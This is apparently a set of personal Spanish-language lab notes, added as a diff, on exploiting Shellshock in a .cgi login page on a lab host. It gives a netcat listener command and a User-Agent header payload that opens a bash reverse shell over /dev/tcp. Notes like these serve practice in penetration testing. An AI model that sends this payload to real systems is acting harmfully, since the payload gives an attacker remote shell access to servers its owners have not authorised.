@@ -1,0 +1,35 @@
+
+   http://10.10.10.7:10000           #! panel de login , probamos admin admin return error
+
+  
+   http://10.10.10.7:10000/session_login.cgi              #! atento a la extensi[on .cgi
+
+
+
+#!#! articulos genial en google: shellshock attack how attackers          'blog.cludflare.com      Inside Shellshock: How hakcers are using it to exploit system'
+              
+
+        curl -H "User.Agent: () { :; }; /bin/eject" http://example.com
+                
+                eject       expulsa la disquetera o cdRom
+
+
+
+
+      #! nos ponemos en escucha en el puerto 443
+::: bash
+
+::: nc -nlvp 443
+
+
+      #! interceptamos la petici[on con burp de:
+
+   http://10.10.10.7:10000/session_login.cgi              #! atento a la extensi[on .cgi
+   
+      #! modificamos el User-Agent en burp despu[ed de interceptar
+
+   User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/miIpHere/443 0>&1                #! oneLiner de monkeyPentester
+
+
+::: whoami            #! :)
+
